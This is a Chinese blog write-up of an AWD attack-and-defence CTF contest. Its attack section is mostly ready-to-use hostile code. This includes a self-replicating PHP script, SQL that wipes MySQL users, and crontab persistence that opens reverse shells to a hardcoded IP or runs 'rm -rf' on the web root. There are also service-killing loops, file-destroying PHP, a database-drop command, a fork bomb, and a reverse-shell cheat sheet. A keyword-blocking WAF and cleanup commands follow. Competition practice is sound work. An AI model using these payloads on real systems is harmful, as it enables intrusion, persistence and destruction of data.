---
title: 蓝帽杯awd总结
date: 2019-08-23 22:25:45
tags:
---

&emsp;&emsp;最近沉迷于学习verilog以及计算机底层的相关知识,已经很久没有搞安全了.突然有机会打一场向往已久的AWD令我很是期待.终于我和朴淳 国峰 兴致冲冲的来到了国家会议中心,好生气派.

![blue_hat1](https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/blue_hat1.jpg?raw=true)

&emsp;&emsp;下午比赛刚开始,所有服务器直接宕机...不得不说奇安信这个做的不好.过了很久之后修好了,然后我们直接就被打懵了.一直疯狂掉分,直到挂上waf才稍有好转.总结一下学到的一点经验:  

### 关于进攻  

---  

&emsp;&emsp;反正这一次一下攻击都没有打,全程做防御.因为根本来不及代码审计,赛后问了一下对面的大佬怎么打的,他们说是thinkphp的cve,他们也就找到一个洞,然后就进了前十...可见赛前资料的准备有多么重要.另外就后门而言,见到了好几个特别骚的木马,当然不死马是最基础的,其实不死马能起作用主要是因为目录权限配置的有问题,主目录直接给了777肯定会被日啊.普通目录尽量别给写的权限.

&emsp;&emsp;还有一种马是base64加密马,然后添加crontab来写一句话木马.妈的这个是真的难受,我只能写shell一直删,还有就是一定要搅屎.我们有个nginx服务直接被删掉了,我都没发现有这个目录...然后服务一down开始疯狂掉分,我只好去偷别人的静态网页,诶,心里苦.  

&emsp;&emsp;关于搅屎,我痛定思痛,写了好几个搅屎棍:

- 无限复制:  

```php
<?php
    set_time_limit(0);
    ignore_user_abort(true);
    while(1){
        file_put_contents(randstr().'.php',file_get_content(__FILE__));
        file_get_contents("http://127.0.0.1/");
    }
?>
```

> 连名都是随机的,疯狂占资源,算是ddos吧  


- 改数据库密码:  

```sql
update mysql.user set authentication_string=PASSWORD('p4rr0t');# 修改所有用户密码
flush privileges;
UPDATE mysql.user SET User='aaaaaaaaaaaa' WHERE user='root'; 
flush privileges;
delete from mysql.user ;#删除所有用户
flush privileges;
```
&emsp;&emsp;当时比赛的时候没想起来...

- 各种crontab骚东西:  

```python
#!/usr/bin/env python3
import base64


def crontab_reverse(reverse_ip, reverse_port):
    crontab_path = "/tmp"
    cmd = 'bash -i >& /dev/tcp/%s/%d 0>&1' % (reverse_ip, reverse_port)
    crontab_cmd = "* * * * * bash -c '%s'\n" % cmd
    encode_crontab_cmd = base64.b64encode(crontab_cmd)
    cmd = "/bin/echo " + encode_crontab_cmd + " | /usr/bin/base64 -d | /bin/cat >> " + crontab_path + "/tmp_rev.conf" + " ; " + "/usr/bin/crontab " + crontab_path + "/tmp.conf"
    return cmd


def crontab_rm(rm_paths='/var/www/html/'):
    crontab_path = "/tmp"
    cmd = '/bin/rm -rf %s' % rm_paths
    crontab_cmd = "* * * * * %s\n" % cmd
    encode_crontab_cmd = base64.b64encode(crontab_cmd)
    cmd = "/bin/echo " + encode_crontab_cmd + " | /usr/bin/base64 -d | /bin/cat >> " + crontab_path + "/tmp_rm.conf" + " ; " + "/usr/bin/crontab " + crontab_path + "/tmp.conf"
    return cmd


def crontab_flag_submit(flag_server, flag_port, flag_api, flag_token,
                        flag_host):
    crontab_path = '/tmp'
    cmd = '/usr/bin/curl "http://%s:%s/%s" -d "token=%s&flag=$(curl %s)" ' % (
        flag_server, flag_port, flag_api, flag_token, flag_host)
    crontab_cmd = "* * * * * %s\n" % cmd
    encode_crontab_cmd = base64.b64encode(crontab_cmd)
    cmd = "/bin/echo " + encode_crontab_cmd + " | /usr/bin/base64 -d | /bin/cat >> " + crontab_path + "/tmp_submit.conf" + " ; " + "/usr/bin/crontab " + crontab_path + "/tmp.conf"
    return cmd


#  cmd = crontab_flag_submit(flag_server='0.0.0.0',
                          #  flag_port='8888',
                          #  flag_api='submit',
                          #  flag_token='bcbe3365e6ac95ea2c0343a2395834dd',
                          #  flag_host='http://192.168.100.1/Getkey')
#  print(cmd)

cmd = crontab_reverse('202.204.62.222',6666)
print(cmd)
```
&emsp;&emsp;这个应该算是最牛逼的马了,waf基本挡不住,杀也杀不死.  


- 疯狂日apache2和nigix:

```sh
#!/usr/bin/env sh
while [[ 1 ]]
do
    service apache2 stop
    service nginx stop
done &
```

&emsp;&emsp;杀不死基本凉凉,服务down扣分贼严重,

- 删东西:

```php
<?php
    set_time_limit(0);
    ignore_user_abort(1);
    unlink(__FILE__);
    function getfiles($path){
        foreach(glob($path) as $afile){
            if(is_dir($afile))
                getfiles($afile.'/*.php');
            else
                @file_put_contents($afile,"#Anything#");
                //unlink($afile);
        }
    }
    while(1){
        getfiles(__DIR__);
        sleep(10);
    }
?>

<?php
    set_time_limit(0);
    ignore_user_abort(1);
    array_map('unlink', glob("some/dir/*.php"));
?>
```

&emsp;&emsp;不说了,心里痛...qaq  


- 删库跑路:

```python
#!/usr/bin/env python3
import base64
def rm_db(db_user,my_db_passwd):
    cmd = "/usr/bin/mysql -h localhost -u%s %s -e '"%(db_user,my_db_passwd)
    db_name = ['performance_schema','mysql','flag']
    for db in db_name:
        cmd += "drop database %s;"%db
    cmd += "'"
    return cmd  
```

&emsp;&emsp;这个应该也是杀伤力极强,基本不会有人备份库子...

- fork_bomb  

```sh
#!/bin/sh
/bin/echo '.() { .|.& } && .' > /tmp/aaa;/bin/bash /tmp/aaa;
```

&emsp;&emsp;这东西不及时发现就凉了,磁盘一会就爆了

- 反弹后门技巧

> shell

```sh
nc -e /bin/bash 1.3.3.7 4444
bash -c 'bash -i >/dev/tcp/1.3.3.7/4444 0>&1'
zsh -c 'zmodload zsh/net/tcp && ztcp 1.3.3.7 4444 && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:1.3.3.7:4444  
```

>python

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_REAM);s.connect(("127.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

> php

```php
php -r '$sock=fsockopen("your_ip","4444");exec("/bin/sh -i <&3 >&3 2>&3");'
```

> windows

```powershell
nc.exe -e /bin/bash 1.3.3.7 4444
```

&emsp;&emsp;看到这么多罪恶的脚本心里好受了许多

> 一定要记得流量混淆,瞎鸡儿发一下垃圾包假装连一句话混淆视听

### 关于防御  

--- 

&emsp;&emsp;防御是真的难,但也基本就一下几点:

1. 日志
    - /var/log/apache2/access.log
    - /var/log/apache2/error.log
    - /var/log/nginx/access.log
    - /var/log/nginx/error.log

2. 要快速弄清楚服务的目录,做好备份!!!!!!!
    - 去看/etc/apache2/ports.conf和/etc/apache2/sites-available/000-default.conf,快速找到目录和对应端口
    - 去/etc/nginx/ 基本差不多
    - 不做备份哭鸡鸡
    
3. 配置目录权限,尽量不要给777

4. 挂waf,但是框架挂waf有些困难,我得再研究一下挂在哪里比较合适,盲猜得挂路由...
    - 这是我魔改的蜜罐,过滤了crontab和base64,我真是怕了...
    - 需要注意的是,最好建一个log目录然后给777,最好不要直接把log写在当前目录下
    
```php
<?php
error_reporting(0);
define('LOG_FILENAME', 'log.txt');
function waf() {
    if (!function_exists('getallheaders')) {
        function getallheaders() {
            foreach ($_SERVER as $name => $value) {
                if (substr($name, 0, 5) == 'HTTP_') $headers[str_replace(' ', '-', ucwords(strtolower(str_replace('_', ' ', substr($name, 5))))) ] = $value;
            }
            return $headers;
        }
    }
    $get = $_GET;
    $post = $_POST;
    $cookie = $_COOKIE;
    $header = getallheaders();
    $files = $_FILES;
    $ip = $_SERVER["REMOTE_ADDR"];
    $method = $_SERVER['REQUEST_METHOD'];
    $filepath = $_SERVER["SCRIPT_NAME"];
    //rewirte shell which uploaded by others, you can do more
    foreach ($_FILES as $key => $value) {
        $files[$key]['content'] = file_get_contents($_FILES[$key]['tmp_name']);
        file_put_contents($_FILES[$key]['tmp_name'], "virink");
    }
    unset($header['Accept']); //fix a bug
    $input = array(
        "Get" => $get,
        "Post" => $post,
        "Cookie" => $cookie,
        "File" => $files,
        "Header" => $header
    );
    //deal with
    $pattern = "select|insert|update|delete|and|or|\'|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile|dumpfile|sub|hex";
    $pattern.= "|file_put_contents|fwrite|curl|system|eval|assert|crontab|base64";
    $pattern.= "|passthru|exec|system|chroot|scandir|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore";
    $pattern.= "|`|dl|openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|assert|pcntl_exec";
    $vpattern = explode("|", $pattern);
    $bool = false;
    foreach ($input as $k => $v) {
        foreach ($vpattern as $value) {
            foreach ($v as $kk => $vv) {
                if (preg_match("/$value/i", $vv)) {
                    $bool = true;
                    logging($input);
                    break;
                }
            }
            if ($bool) break;
        }
        if ($bool) break;
    }
}
function logging($var) {
    file_put_contents(LOG_FILENAME, "\r\n" . time() . "\r\n" . print_r($var, true) , FILE_APPEND);
    // die() or unset($_GET) or unset($_POST) or unset($_COOKIE);
}
waf();
?>
```

5. 写shell监视文件变化

6. 不死马删除
    - 杀死www-data的进程,然后新建一个同名的文件
    - crontab马...只能写shell了,或者用php脚本删除crontab

```php
#!/usr/bin/env sh
ps -aux|grep 'www-data'|awk '{print $2}'|xargs kill -9
```

### 总结  

---

&emsp;&emsp;其实awd不在于漏洞多,在于cve的利用和搅屎,有一段时间我们没有掉分结果排名十分靠前,说明能进攻的队基本没几个,所以在准备不周的情况下做好防御就行了.
&emsp;&emsp;然后就是赛后一定要多尝试,要去熟悉主流框架的cve比如thinkphp laravel之类的.真正比赛的时候根本来不及仔细看哪些是后门,也没时间代码审计,全靠手感和经验.

#### 广告

---

&emsp;&emsp;这是我写的awd攻击框架(虽然没用上...),能批量shell执行,很舒服.欢迎体验[parrot_shell](https://github.com/Explainaur/P4rr0t_shell)

![parrot](https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/blue_hat2.jpg?raw=true)

&emsp;&emsp;最后来一张队友合照,嘿嘿404 forever

![404](https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/blue_hat3.jpg?raw=true)





































